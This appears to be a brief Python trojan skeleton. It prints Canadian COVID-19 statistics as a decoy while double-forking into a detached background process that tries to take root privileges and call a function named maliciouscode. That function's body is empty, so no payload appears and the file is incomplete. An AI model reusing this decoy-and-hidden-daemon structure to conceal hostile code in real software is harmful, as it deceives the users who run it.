

import json
import requests
import os
import sys
import signal



def main():
    try:
        pid = os.fork()
        if pid>0:
            getStat()
            sys.exit(0)
    except OSError:
        sys.exit(0)
    
    os.chdir('/') 
    os.umask(0) 
    os.setsid()
    os.setuid(0)
    os.setgid(0)
    
    try:
        pid = os.fork()
        if pid>0:
            sys.exit(0)
    except OSError:
        sys.exit(0)
            
    if pid==0:
        maliciouscode()
            
            
            
def getStat():
    url = "https://api.covid19tracker.ca/summary"
    apiResponse = requests.get(url)
    responseText = apiResponse.json()
    responseTextStr = json.dumps(responseText,  indent=4,  sort_keys=True)

    for index in responseText['data']:
        print(f"The total cases in Canada is {index['total_cases']}, and {index['total_fatalities']} have died while {index['total_recoveries']} have recovered")
        print (f"The latest date this was updated was {index['latest_date']}")
        
def maliciouscode():
    
